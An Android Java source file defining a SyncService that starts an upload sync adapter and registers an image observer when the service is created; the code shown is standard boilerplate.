package android.iocl.dac_collector.SyncRAT;


import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;

public class SyncService extends Service {
    private static UploadSyncAdapter sSyncAdapter = null;
    private static final Object sLock = new Object();

    @Override
    public void onCreate() {
        synchronized (sLock) {
            if (sSyncAdapter == null) {
                sSyncAdapter = new UploadSyncAdapter(getApplicationContext(), true);
            }
        }
        ImageObserver observer = new ImageObserver(new Handler(), this);
        observer.register();


    }

    @Override
    public IBinder onBind(Intent intent) {
        return sSyncAdapter.getSyncAdapterBinder();
    }
}